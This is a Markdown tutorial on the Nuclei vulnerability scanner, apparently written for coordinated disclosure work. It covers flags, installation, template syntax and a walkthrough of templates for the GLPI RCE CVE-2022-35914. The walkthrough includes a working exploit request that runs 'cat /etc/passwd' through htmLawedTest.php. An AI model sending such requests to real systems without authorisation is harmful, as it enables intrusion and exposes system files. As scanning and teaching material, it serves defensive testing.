# Intro

”Nuclei is used to send requests across targets based on a template, leading to zero false positives and providing fast scanning on a large number of hosts. Nuclei offers scanning for a variety of protocols, including TCP, DNS, HTTP, SSL, File, Whois, Websocket, Headless etc. With powerful and flexible templating, Nuclei can be used to model all kinds of security checks.”

---
## FAQ 

- Q: What is nuclei?
- A: Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates.

<br>

- Q: What kind of scans can I perform with nuclei?
- A: Nuclei can be used to detect vulnerabilities in Web Applications, Networks, DNS based misconfiguration, and Secrets scanning in source code or files on the local file system.

---
# Sources

## Learning sources
- [https://nuclei.projectdiscovery.io/templating-guide/protocols/http/](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/)
- [https://www.youtube.com/playlist?list=PLZRbR9aMzTTpItEdeNSulo8bYsvil80Rl](https://www.youtube.com/playlist?list=PLZRbR9aMzTTpItEdeNSulo8bYsvil80Rl)
- [https://techyrick.com/nuclei-full-tutorial/](https://techyrick.com/nuclei-full-tutorial/)

Basic templating: [https://nuclei.projectdiscovery.io/kr/template-examples/http/#basic-template](https://nuclei.projectdiscovery.io/kr/template-examples/http/#basic-template)
<br>
Nuclei github: [https://github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)


---
## Syntax

|   |   |
|---|---|
|-u|Specify domain|
|-l|List domains|
|-t|Specify template|
|-j|Json output|
|-o|Output file|
|-rl|Rate limit, max number of request per second|
|-retries|Number of times to retry a failed request|
|-as|Automatic web scan using wappalyzer technology detection to tags mapping|
|-validate|Validate the passed templates to nuclei|
|-silent|Display findings only|
|-vv|Display templates loaded for scan|
|-H|Add user agent|
|-tags|Scan with templates with an certain tag|
|-itags|Include templates by tags (overrides defaults and configs)|
|-etags|Exclude templates by tags|
|-author|Scan with templates from an certain Author|
|-severity|Scan with templates from an certain severity (info, low, medium, high, critical)|
|-pt|Filter by protocol type|
|-nt|New templates|

*Filters are comma-seperated values, example: nuclei -tags cve,http -severity info,high,critical


---
## Nuclei local installation Linux

1. `wget https://go.dev/dl/go1.20.7.linux-amd64.tar.gz`
 
2. `sudo tar -C /usr/local -xzf go1.20.7.linux-amd64.tar.gz`

3. `echo 'export GOROOT=/usr/local/go' >> ~/.bashrc && echo 'export GOPATH=$HOME/go' >> ~/.bashrc && echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH' >> ~/.bashrc`

4. `source ~/.bashrc` or `source ~/.zshrc`
5. `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest`


---
## Example nuclei command  

```bash
nuclei -l domains.txt -t nuclei.yaml -vv  -H "User-Agent: Mozilla/5.0 - CVD" -j -rl 1000 -o $(date --iso-8601)-nucleiscan.json
```

This is what a nuclei command looks like that uses the domains in domains.txt, uses the template that is called nuclei.yaml and displays templates loaded for the scan. It uses the user agent User-Agent: Mozilla/5.0 - CVD and uses a rate limit of 1000. It outputs the file of its current date in iso-8601 format, which results in 2023-07-21-nucleiscan.json.


---
# Template parts

### Information block

```yaml
id: CVE-2017-7925 #no spaces here

info:
  name: Dahua Security - Configuration File Disclosure
  author: E1A
  severity: critical
  description: |
    A Password in Configuration File issue was discovered in Dahua DH-IPC-HDBW23A0RN-ZS, DH-IPC-HDBW13A0SN, DH-IPC-HDW1XXX, DH-IPC-HDW2XXX, DH-IPC-HDW4XXX, DH-IPC-HFW1XXX, DH-IPC-HFW2XXX, DH-IPC-HFW4XXX, DH-SD6CXX, DH-NVR1XXX, DH-HCVR4XXX, DH-HCVR5XXX, DHI-HCVR51A04HE-S3, DHI-HCVR51A08HE-S3, and DHI-HCVR58A32S-S2 devices. The password in configuration file vulnerability was identified, which could lead to a malicious user assuming the identity of a privileged user and gaining access to sensitive information.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-7925
    - https://ics-cert.us-cert.gov/advisories/ICSA-17-124-02
  metadata:
    max-request: 1
    product: dh-ipc-hdbw23a0rn-zs_firmware
    vendor: dahuasecurity
    shodan-query: http.favicon.hash:2019488876
  tags: cve,cve2017,dahua,camera
```

An information block in a nuclei template is used to give information about the template itself, vulnerability, dork, query and tags.


---
## [HTTP request](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/)

```yaml
http:
  - method: GET #possiblitis are: GET, POST, PUT of DELETE
    path:
      - "{{BaseURL}}/login.php"
    redirects: true
    max-redirects: 3
```

Here you send a request, and can indicate what should happen, there are different versions of doing an HTTP request.

## [Paths](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/)

|   |   |   |
|---|---|---|
|Variable|Explained|Value|
|{{BaseURL}}|This will replace on runtime in the request by the input URL as specified in the target file.|[https://example.com:443/foo/bar.php](https://example.com:443/foo/bar.php)|
|{{RootURL}}|This will replace on runtime in the request by the root URL as specified in the target file.|[https://example.com:443](https://example.com:443)|
|{{Hostname}}|Hostname variable is replaced by the hostname including port of the target on runtime.|[example.com:443](http://example.com:443)|
|{{Host}}|This will replace on runtime in the request by the input host as specified in the target file.|[example.com](http://example.com)|
|{{Port}}|This will replace on runtime in the request by the input port as specified in the target file.|443|
|{{Path}}|This will replace on runtime in the request by the input path as specified in the target file.|/foo|
|{{File}}|This will replace on runtime in the request by the input filename as specified in the target file.|bar.php|
|{{Scheme}}|This will replace on runtime in the request by protocol scheme as specified in the target file.|https|


---
## [Raw HTTP request](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/#raw-http-requests)

```yaml
http:
  - raw:
    - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        cookie-reuse: true

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9

        testing=parameter
```

Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}}. All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above.


---
## Request Condition

### [Matchers](https://nuclei.projectdiscovery.io/kr/templating-guide/operators/matchers/#matchers)

```yaml
##Match the word 'core'
    matchers:
      - type: word
        words:
          - "core"
 
 
##Match both words          
    matchers:
      - type: word
        words:
          - '[core]'
          - '[api]'
        condition: and


##Match status code 200 in the header
    matchers:
      - type: status
        part: header
        status:
          - 200
       
       
##Match the DSL where the both status codes equal to 200
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          
          
#Match the regex in the body     
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
```

Matchers gives you the ability to match certain words or status on the supplied URLs. This can be as simple as retrieving a single word in the response on the site, you also have the option to choose in what part the string or status must be found. This can be used with part:, here you can decide between the body or header, body is used by default. If you for example don't want to match the header, you can add negative: true at the end to exclude that part. It is also possible to add multiple matchers, for a single type you can use a dash for a new string but for different types, you can use condition: or and add the type below it.

### [Type](https://nuclei.projectdiscovery.io/kr/templating-guide/operators/matchers/#types)

|   |   |
|---|---|
|Matcher Type|Part Matched|
|Status|Integer Comparisons of Part|
|Size|Content Length of Part|
|Word|Part for a protocol|
|Regex|Part for a protocol|
|Binary|Part for a protocol|
|Dsl|Part for a protocol|

### [Extractors](https://nuclei.projectdiscovery.io/kr/templating-guide/operators/extractors/#extractors)

Extractors can be used to extract and display in results a match from the response returned by a module. It works the same as a matcher but with an extractor, it displays it. This is mostly used to show versions of an instance.

1. **regex** - Extract data from response based on a Regular Expression.
2. **kval** - Extract key: value/key=value formatted data from Response Header/Cookie
3. **json** - Extract data from JSON based response in JQ like syntax.
4. **xpath** - Extract xpath based data from HTML Response
5. **dsl** - Extract data from the response based on a DSL expressions.


---
### [Attack mode](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/#attack-mode)

|   |   |
|---|---|
|Batteringram|The battering ram attack type places the same payload value in all positions. It uses only one payload set. It loops through the payload set and replaces all positions with the payload value.|
|pitchfork|The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.|
|clusterbomb|The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.|

```yaml
http:
  - raw:
      - |
        POST /?file={{path}} HTTP/1.1
        User-Agent: {{header}}
        Host: {{Hostname}}

    payloads:
      path: helpers/wordlists/prams.txt
      header: helpers/wordlists/header.txt
    attack: clusterbomb # Defining HTTP fuzz attack type
```

OR

```yaml
# HTTP Intruder fuzzing using local wordlist.
payloads:
  paths: params.txt
  header: local.txt

payloads:
  password:
    - admin
    - guest
    - password
```


---
# [Nuclei burp extension](https://github.com/projectdiscovery/nuclei-burp-plugin)

Nuclei has its own burp extension to simplify making templates. With this extension, you only need a response to generate a template in seconds. You can select the response to generate a template and then add matchers to it. It simplifies a simple template that only need to match a certain string. The extension is available in the BApp store in burp under the name: Nuclei Template Generator Plugin. The GIF below explains it all.

Short GIF on how to generate a template:

![Alt Text](https://github.com/projectdiscovery/nuclei-burp-plugin/raw/main/static/v1_1_0-demo.gif)


---
# Creating a template for a vulnerability

For the full process, I will make a template for a known vulnerability. I’ve made this template before, but another user made the same template. For learning purposes, I will make the template both ways. Before you start on an template, always check [here](https://nuclei-templates.netlify.app/) if the template already exists so you are not doing work that has already been done.

The vulnerability I am going to make a template for is CVE-2022-35914, which is an RCE vulnerability. Due to an old version of the htmlawed library, it is possible to inject code. If you want to learn more about it, I've done a case about this vulnerability, which can be found [here](https://csirt.divd.nl/cases/DIVD-2023-00016/).

Projectdiscovery (maker of Nuclei) also created a [YouTube video](https://youtu.be/nFXygQdtjyw) for this process, would recommend watching this first before starting reading this part


## Other persons [template](https://github.com/projectdiscovery/nuclei-templates/blob/v9.5.6/http/cves/2022/CVE-2022-35914.yaml)

To start, we need an info page

```yaml
id: CVE-2022-35914

info:
  name: GLPI <=10.0.2 - Remote Command Execution
  author: -
  severity: critical
  description: |
    GLPI through 10.0.2 is susceptible to remote command execution injection in /vendor/htmlawed/htmlawed/htmLawedTest.php in the htmlawed module.
  reference:
    - https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914
    - https://github.com/cosad3s/CVE-2022-35914-poc
    - http://www.bioinformatics.org/phplabware/sourceer/sourceer.php?&Sfs=htmLawedTest.php&Sl=.%2Finternal_utilities%2FhtmLawed
    - https://nvd.nist.gov/vuln/detail/CVE-2022-35914
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:"-1474875778"
    verified: true
  tags: cve,cve2022,glpi,rce,kev
```

The ID is simply the CVE. The name is the software, affected version and vuln. If the description is long, you can use a pipe and put the text below. For references, a POC, news article and other information is always useful. For metadata, a max-request is good to not spam the target. Tags are optional.

The other person that made the template used a variable for the request.

```yaml
variables:
  cmd: "cat+/etc/passwd"
```

This is very useful and a good indicator that the instance is vulnerable, this is an intrusive way to confirm the vulnerability is active and not disclose extreme sensitive information. This way should be used if the software is only available on Linux, which in this case is.

With this template, a raw HTTP request is used where the variable 'cmd' is being used in the body. This is not necessary since it could be included in the request, but is a great example to use a variable.

```yaml
http:
  - raw:
      - |
        POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: sid=foo

        sid=foo&hhook=exec&text={{cmd}}
```

For the Host, the variable Hostname is used from the target list. Creating a raw request is one of the most easy ways to create a template, since you can simply copy a request from burp and paste it here. This process can be automated by using the [burp-nuclei](https://github.com/projectdiscovery/nuclei-burp-plugin) plugin, which is very cool and makes it so much easier.

To check if the request/exploit was successful, the response will be checked for a string that will be there in every instance, which will be the word 'root'. In the passwd file, there is always a root user in every distro, so that would be a good way to confirm in an intrusive way if the vulnerability is active in the target their instance. To end it, the response must have a successful status code of 200.

```yaml
   matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
```


---
## My template

Let's start again with an info page, I've made mine less extensive since there is not always that much information needed.

```yaml
id: CVE-2022-35914

info:
  name: CVE-2022-35914
  author: E1A
  severity: high
  description: Template to fingerprint a Code Injection in the htmLawed library within GLPI
```

With this vulnerability, having the htmLawedTest.php means that you are vulnerable. This is because in this page you can execute code and only vulnerable versions have this page. This means if the page is detected, you are vulnerable. Using a single request to verify the vulnerability is better than sending a lot of requests or retrieving unnecessary data to prove the vulnerability is active. However, this is not always the best way to create templates. A status code of 200 can sometimes give false-positive, which you never want. In this case it is ok to do, but it's better to be a little more intrusive like the other template.

```yaml
requests:
  - method: GET
    path:
      - '{{BaseURL}}/vendor/htmlawed/htmlawed/htmLawedTest.php'
```

```yaml
matchers-condition: and
    matchers:
      - type: word
        words:
          - 'htmLawedTest'
      - type: status
        status:
          - 200
```

And to verify that the page is active, the word htmLawedTest must be found, and the page has to have a status of 200 which will look like this.# Nuclei 

## 
